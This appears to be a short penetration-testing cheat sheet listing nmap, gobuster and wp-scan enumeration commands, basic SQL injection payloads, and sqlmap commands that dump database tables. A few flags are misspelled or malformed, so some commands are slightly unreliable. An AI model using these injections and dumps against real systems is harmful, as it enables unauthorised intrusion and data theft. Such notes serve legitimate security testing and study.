# Enumeration 

## nmap

Quick scan
```bash
nmap <ip> --top-ports 30
```

Default scan
```bash
nmap <ip> -sV -sC
```

Detailed scan
```bash
nmap <ip> -p-
```

## Directory enumeration
```
gobuster dir -u <url> -w <wordlist>
```

## Domain enumeration
```
gobuster dns -d <domain> -w <wordlist>
```

## Vhost enumeration

```
gobuster vhost -u <url> --apend-domain -w <wordlist>
```

[ffuf scans much faster using HOST header](http://ffuf.me/sub/vhost)

## SQLInjection
Basic injections to test for strings:
```
bla' or 1=1; --
bla" or 1=1; --
bla' or 1=1; #
bla" or 1=1; #
```

Basic injections to test for integers:
```
1234 or 1=1; --
1234 or 1=1; #
```

Detect database type: [Details here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md#dbms-identification)

Use sqlmap the following way if the string is closed via `"` ([details](https://github.com/sqlmapproject/sqlmap/wiki/Usage#custom-injection-payload))
```
sqlmap http://host.de/?para=anything --prefix'"'
```

Use sqlmap by defining raw request (e.g. raw http in request.req):
```
sqlmap -r request.req -p <parameter>
```

sqlmap enumeration after successful injection:
```bash
# show all databases
sqlmap <url> -p <parameter> --dbs
# show all tables in database
sqlmap <url> -p <parameter> -D <database> --tables
# dump table
sqlmap <url> -p <parameter> -D <database> -T <table> --dump
```

## Wordpress
Use `wp-scan` to enumerate WordPress sites (use [api-token](https://wpscan.com/) to list vulnerabilities of found wp version/plugins).
 ```bash
 # enumerate vulnerable plugins (aggressive checks)
wp-scan --url <url> --enumerate vp --plugins-detection aggressive
 ```